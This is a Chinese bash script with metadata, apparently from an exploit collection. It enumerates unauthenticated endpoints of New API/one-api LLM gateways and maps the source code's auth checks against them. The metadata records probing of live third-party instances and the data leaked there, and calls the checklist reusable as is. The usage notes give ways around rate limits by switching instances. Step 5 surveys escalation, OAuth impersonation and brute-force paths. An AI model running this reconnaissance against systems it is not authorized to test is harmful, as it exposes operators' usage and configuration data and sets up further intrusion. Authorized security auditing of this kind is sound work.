# New API / one-api 未授权面枚举与源码鉴权对照审计清单

- **code**: new-api-one-api-未授权面枚举与源码鉴权对照审计清单
- **kind**: script
- **category**: info-leak
- **component**: New API (Calcium-Ion/new-api) / one-api
- **versions**: v1.0.0-rc.24 实测；鉴权结构对 one-api 分支多数版本通用
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.118:4203（糖果姐姐 / example.com）与 :4303（CookingAI / target2.example.com）实测，两实例均为 New API target1.example.com。命中 4 条未授权可读：/api/rankings（19899B，3.6 亿 tokens 用量与按日曲线）、/api/perf-metrics/summary（5838B，45 模型性能）、/api/perf-metrics?model=（泄露内部 group 名）、/api/user/groups（全部分组倍率）；另 /mj/image/:id 实证未认证可达（400 midjourney_task_not_found 而非 401）。步骤 5 的全部"不可行路径"均已通过读对应 tag 源码逐行证伪，非猜测。未取得 admin 与渠道密钥。【2026-09-28 tgt3767-top 复测：target3.example.com（源站 203.0.113.63:443 直连 + CF 边缘双路）New API v1.0.0-rc.37 清单全部成立——拉 rc.37 tag 源码逐行确认 header_nav.go fallback{Enabled:true,RequireAuth:false} 与 api-router.go L36-43/L89 挂载不变；命中 /api/rankings(3628B,242,884,563 tokens+7日曲线)、/api/perf-metrics/summary、/api/user/groups、/api/pricing(4018B,13模型计费)；/mj/image/:id 未认证可达 400；v1.0.0-rc.37 起 /v1/models 亦需 token(401)。/api/ratio_config 该实例已禁用(403)。清单对 rc.37 仍有效，可直接复用】
- **path**: pocs/new-api-one-api-未授权面枚举与源码鉴权对照审计清单/newapi_unauth_audit.sh
- **tags**: new-api,one-api,未授权,信息泄露,源码对照,审计清单
- **created_at**: 2026-09-27T18:01:47.651Z
- **found_by**: exploit

## 用法

```
T=http://host:port bash newapi_unauth_audit.sh
先跑步骤 1 拿到 X-New-Api-Version，把步骤 2 的 tag 换成实际版本再拉源码。
步骤 3/4 的路径清单直接循环打；命中 429 立刻停手，换实例或等 Retry-After。
必须带 --noproxy "*"（本机若有 HTTP 代理会污染结论）。
对 4203/4303 这类同 IP 多端口部署，注意它们通常是**独立实例与独立限速桶**，一侧被限速可切另一侧。
```

## 正文

```
#!/usr/bin/env bash
# New API / one-api 未授权面枚举与鉴权对照审计清单
# 用法: T=http://host:port; bash newapi_unauth_audit.sh
# 关键前提：若本机有 HTTP 代理，务必加 --noproxy "*"，否则会拿到出口代理页面导致结论全错。

T="${T:-http://127.0.0.1:3000}"
CURL="curl -k -s --noproxy * -m 10"

# ---------- 步骤 1：锁定精确版本（决定该看哪个 tag 的源码）----------
$CURL -i "$T/api/status" | grep -i "x-new-api-version"
$CURL "$T/api/status" | python3 -c "import sys,json;d=json.load(sys.stdin)['data'];print({k:d.get(k) for k in ['version','system_name','github_oauth','github_client_id','register_enabled','email_verification','turnstile_check','HeaderNavModules','self_use_mode_enabled','server_address']})"
# 同时可读 /api/about、/api/setup。注意 /api/setup 的 root_init 是零值假象：
# controller/setup.go 中 `if constant.Setup { c.JSON(...); return }` 提前返回，
# RootInit/DatabaseType 从未赋值，恒为 false/""，**不代表 root 未初始化**。

# ---------- 步骤 2：源码对照（比字典枚举准）----------
tag="target1.example.com"   # 换成步骤 1 得到的版本
for f in router/api-router.go router/channel-router.go router/relay-router.go \
         router/video-router.go router/dashboard.go router/authz-router.go \
         middleware/auth.go middleware/header_nav.go middleware/rate-limit.go \
         controller/setup.go controller/user.go controller/token.go controller/oauth.go \
         controller/misc.go common/verification.go; do
  curl -s -m 25 -x http://127.0.0.1:7892 -O "https://raw.githubusercontent.com/Calcium-Ion/new-api/$tag/$f"
done
# 判定要点：路由注册顺序决定鉴权 —— gin 中 `Group.GET(...)` 写在 `.Use(TokenAuth())` 之前的路由
# 不经过该中间件（见 relay-router.go 的 /mj/image/:id）。

# ---------- 步骤 3：未认证端点清单逐个打（不带任何 token）----------
for p in /api/status /api/about /api/notice /api/home_page_content /api/user-agreement \
         /api/privacy-policy /api/uptime/status /api/pricing /api/rankings \
         /api/perf-metrics/summary "/api/perf-metrics?model=gpt-4o" /api/user/groups \
         /api/ratio_config /api/setup /api/verification /api/models /api/group \
         /api/channel/ /api/option/ /api/token/ /api/user/self /api/redemption/ \
         /api/log/ /api/mj/self /api/authz/catalog /api/models_enabled /metrics; do
  printf "%-38s %s\n" "$p" "$($CURL -o /dev/null -w '%{http_code} %{size_download}' "$T$p")"
done
# 判读：200 且响应体含真实数据 = 未授权；401/403 = 有鉴权；404 = 不存在。
# 重点看：/api/rankings（平台全量用量与按日曲线）、/api/perf-metrics（模型性能与内部 group 名）、
#        /api/user/groups(全部分组倍率)。
# HeaderNavModules 为空串时 middleware/header_nav.go 走 fallback{RequireAuth:false}，
# 故 pricing/rankings/perf-metrics 默认对匿名公开 —— 属"设计默认公开"，非鉴权绕过，定级时须说明。

# ---------- 步骤 4：relay 类端点未认证探测 ----------
for p in /mj/image/1 /mj/image/999999 /v1/models /v1beta/models ; do
  printf "%-24s %s\n" "$p" "$($CURL -o /dev/null -w '%{http_code} %{size_download}' "$T$p")"
done
# /mj/image/:id 返回 400 {"error":"midjourney_task_not_found"} 而非 401 → 未认证可达。
# 对照 /api/mj/self 应为 401，以证明差异。

# ---------- 步骤 5：不可行路径（勿重复投入）----------
# · 注册提权：controller/user.go Register() 硬编码 Role=RoleCommonUser，且 cleanUser 仅取
#   Username/Password/DisplayName/InviterId/Role —— 注入 role/quota/group/status 无效。
# · token 横向越权：GetTokenByIds(id, userId) 双条件 + buildMaskedTokenResponse 用 GetMaskedKey() 脱敏。
# · OAuth 冒充 admin：state 是服务端一次性 flow_token（须先 POST /api/oauth/state），
#   且仅在 GitHub 数字 ID 命中时才登录已有用户，numeric ID 不可控。
# · 任意密码重置：ResetPassword 需邮件验证码，而 GenerateVerificationCode(0) 返回完整 32 字符 UUID
#   （common/verification.go: `if length == 0 { return code }`），高熵不可爆破。
# · 爆破：CriticalRateLimit 按 IP 固定窗口（mark=CT），默认 20 次/20 分钟，且注册/登录/oauth/reset
#   共享同一计数器；命中 429 + Retry-After 即须停手，换实例（不同端口往往是独立限速桶）。
# · /api/channel/:id/key 需 RootAuth + SecureVerificationRequired 双重门槛，
#   拿到 admin 也读不到渠道明文密钥，必须 root。

```
